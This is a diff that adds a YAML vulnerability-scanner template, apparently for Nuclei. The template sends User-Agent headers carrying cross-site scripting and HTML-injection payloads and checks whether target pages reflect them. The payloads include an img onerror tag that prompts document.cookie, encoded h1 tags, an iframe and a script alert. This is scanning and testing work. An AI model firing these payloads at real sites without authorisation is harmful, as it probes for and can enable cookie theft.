@@ -1,0 +1,183 @@
+id: header-reflection-user-agint
+
+info:
+  name: Looking for reflected values from request headers
+  author: mohamed
+  severity: high
+
+http:
+  - method: GET
+    headers:
+      User-Agent: "{{RootURL}}/Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36 \"><h1>test</h1>"
+    path:
+      - "{{BaseURL}}"  
+    redirects: true
+    max-redirects: 5
+    matchers:
+      - type: word
+        part: body
+        name: referr
+        words:
+           - "<h1>test</h1>"    
+
+  - method: GET
+    headers:
+      User-Agent: "{{Hostname}}/Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36\"><h1>test</h1>"
+    path:
+      - "{{BaseURL}}"  
+    redirects: true
+    max-redirects: 5
+    matchers:
+      - type: word
+        part: body
+        name: referr
+        words:
+           - "<h1>test</h1>"    
+
+  - method: GET
+    headers:
+      User-Agent: "{{Hostname}}/Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36';\"/></textarea><Img Src=OnXSS OnError=prompt(document.cookie)>"
+    path:
+      - "{{BaseURL}}"  
+    redirects: true
+    max-redirects: 5
+    matchers:
+      - type: word
+        part: body
+        name: referr
+        words:
+           - "<Img Src=OnXSS OnError=prompt(document.cookie)>"               
+
+  - method: GET
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36{{RootURL}}\"><details onauxclick=x=prompt,x`${document.cookie}`></details>"
+    path:
+      - "{{BaseURL}}"  
+    redirects: true
+    max-redirects: 5
+    matchers:
+      - type: word
+        part: body
+        name: referr
+        words:
+           - "<details onauxclick=x=prompt,x`${document.cookie}`>"       
+
+  - method: GET
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36{{RootURL}}\"%3c%68%31%3e%74%65%65%78%73%73%3c%2f%68%31%3e"
+    path:
+      - "{{BaseURL}}"  
+    redirects: true
+    max-redirects: 5
+    matchers:
+      - type: word
+        part: body
+        name: referr
+        words:
+           - "<h1>teexss</h1>"                
+  - method: GET
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36{{RootURL}}/><iframe id=\"if1\" src=\"https://{{Host}}\"></iframe><!--"
+    path:
+      - "{{BaseURL}}"  
+    redirects: true
+    max-redirects: 5
+    matchers:
+      - type: word
+        part: body
+        name: referr
+        words:
+           - "<iframe id=\"if1\" src=\"https://{{Host}}\">"               
+
+  - method: GET
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36{{RootURL}}%22%2f%3e%7d%3c%68%31%3e%74%65%65%78%73%73%3c%2f%68%31%3e%3c%21%2d%2d%3c%2f%73%63%72%69%70%74%3e"
+    path:
+      - "{{BaseURL}}"  
+    redirects: true
+    max-redirects: 5
+    matchers:
+      - type: word
+        part: body
+        name: referr
+        words:
+           - "<h1>teexss</h1>"     
+  - method: GET
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36{{RootURL}}PGgxPkhUTUxkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGQ8L2gxPgo="
+    path:
+      - "{{BaseURL}}"  
+    redirects: true
+    max-redirects: 5
+    matchers:
+      - type: word
+        part: body
+        name: referr
+        words:
+           - "<h1>HTMLdddddddddddddddddddddddddddddddddddd</h1>"              
+  - method: GET
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36{{RootURL}}<svg width=\"100\" height=\"100\"><circle cx=\"50\" cy=\"50\" r=\"40\" stroke=\"green\" stroke-width=\"4\" fill=\"yellow\" /></svg>"
+    path:
+      - "{{BaseURL}}"  
+    redirects: true
+    max-redirects: 5
+    matchers:
+      - type: word
+        part: body
+        name: referr
+        words:
+           - "<svg width=\"100\" height=\"100\"><circle cx=\"50\" cy=\"50\" r=\"40\" stroke=\"green\" stroke-width=\"4\" fill=\"yellow\" />"               
+
+  - method: GET
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36{{BaseURL}}/\"><h1>test</h1>"
+    path:
+      - "{{BaseURL}}"  
+    redirects: true
+    max-redirects: 5
+    matchers:
+      - type: word
+        part: body
+        name: referr
+        words:
+           - "<h1>test</h1>"    
+  - method: GET
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36{{BaseURL}}/\">%3c%68%31%3e%74%65%65%78%73%73%3c%2f%68%31%3e"
+    path:
+      - "{{BaseURL}}"  
+    redirects: true
+    max-redirects: 5
+    matchers:
+      - type: word
+        part: body
+        name: referr
+        words:
+           - "<h1>teexss</h1>"    
+  - method: GET
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36{{BaseURL}}/><iframe id=\"if1\" src=\"https://{{Host}}\"></iframe><!--"
+    path:
+      - "{{BaseURL}}"  
+    redirects: true
+    max-redirects: 5
+    matchers:
+      - type: word
+        part: body
+        name: referr
+        words:
+           - "<iframe id=\"if1\" src=\"https://{{Host}}\">"           
+  - method: GET
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36{{BaseURL}}/</script><script>alert()</script>"
+    path:
+      - "{{BaseURL}}"  
+    redirects: true
+    max-redirects: 5
+    matchers:
+      - type: word
+        part: body
+        name: referr
+        words:
+           - "</script><script>alert()</script>"             
